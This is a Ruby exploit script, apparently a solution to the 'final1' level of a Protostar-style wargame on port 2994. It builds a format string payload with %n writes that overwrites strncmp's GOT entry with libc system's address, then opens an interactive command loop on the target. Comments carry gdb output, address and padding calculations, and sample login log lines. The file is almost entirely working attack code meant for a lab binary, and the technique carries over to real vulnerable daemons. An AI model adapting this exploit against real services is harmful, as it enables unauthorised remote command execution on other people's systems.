#!/usr/bin/ruby

require 'socket'

puts "> Enter hostname:"
hostname = gets.chomp
port = 2994
socket = TCPSocket.open(hostname, port)

def read_until_str(soc, str)
  buffer = ""
  begin
    buffer += soc.read(1)
  end until buffer.include? str
  return buffer
end

=begin
  (gdb) info functions strncmp
  All functions matching regular expression "strncmp":
  Non-debugging symbols:
  0x08048d9c  strncmp
  0x08048d9c  strncmp@plt

  (gdb) x/3i 0x08048d9c
  0x8048d9c <strncmp@plt>:	jmp    *0x804a1a8
  0x8048da2 <strncmp@plt+6>:	push   $0x160
  0x8048da7 <strncmp@plt+11>:	jmp    0x8048acc

  (gdb) x/x 0x804a1a8
  0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>:	0x08048da2

  (gdb) x system
  0xb7ecffb0 <__libc_system>:	0x890cec83

strncmp jmp to: 0x0804a1a8 <_GLOBAL_OFFSET_TABLE_+188>
system: 0xb7ecffb0 <__libc_system>
=end

=begin
login message looks like:
  Mar 25 21:15:41 (none) final1: Login from 192.168.215.1:59587
  as [Battler Ushiromiya] with password [amore]
  Mar 25 21:17:20 (none) final1: Login from 127.0.0.1:47536
  as [Senri] with password [Nya~]

the length of ip:port is changeable
so it has the potential to affect our Format String Explit
we need a stable padding to deal with it

the maximum size of ip:port is:
000.000.000.000:00000 => 21 characters

so we will use 24 charachters for padding
=end
# this will output a string like: 192.168.215.1:57739
ip_port = socket.addr[3].to_s + ":" + socket.addr[1].to_s
puts "> " + ip_port
socname_padding = "w" * (24 - ip_port.to_s.length)


=begin
to find where to use %n: 
  puts read_until_str(socket, "[final1] $ ")
  socket.puts "username " + socname_padding + "ABCD" + "%x"*17
  puts read_until_str(socket, "[final1] $ ")
  socket.puts "login ABCD"

  Mar 25 22:22:12 (none) final1: Login from 192.168.215.1:64392 as 
  [wwwwwABCD8049ee4804a2a0804a220bffff716b7fd7ff4bffff56869676f4c
  7266206e31206d6f312e3239322e3836312e35313334363a61203239775b207
  37777777744434241] with password [ABCD]

so %17$n will choose the 17th argument which is 44434241
and we can replace it with address of what we want to write
=end

=begin
strncmp jmp to: 0x0804a1a8 <_GLOBAL_OFFSET_TABLE_+188>
system: 0xb7ecffb0 <__libc_system>:	0x890cec83

we need to write 0xb7ecffb0 into 0x0804a1a8
0xb0 = 176 -> 0x0804a1a8
0xff = 255 -> 0x0804a1a9
0xb7ec = 47084 - > 0x0804a1aa
=end
strncmp_addr = [0x0804a1a8].pack("I") + [0x0804a1a8+1].pack("I") + [0x0804a1a8+2].pack("I")

=begin
we also need to count:
  "Login from " and "as ["
which is 16 characters
=end
offset = 16 + ip_port.length + socname_padding.length
# xb0 = 176 = 12 + 164  # strncmp_addr.bytesize = 12
xb0 = "%#{164-offset}x" + "%17$n" # choose the 17th argument
# xff = 255 = 176 + 79
xff = "%79x" + "%18$n"
# xb7ec = 47084 = 255 + 46829
xb7ec = "%46829x" + "%19$n"

response = <<-END
username #{socname_padding}#{strncmp_addr}#{xb0+xff+xb7ec}
END

puts "> send: " + response.inspect
puts read_until_str(socket, "[final1] $ ")
socket.puts response

puts read_until_str(socket, "[final1] $ ")
socket.puts "login lets rock"

puts read_until_str(socket, "[final1] $ ")
puts "> #"

while true
  socket.puts gets
  puts read_until_str(socket, "[final1] $ ")
end

socket.close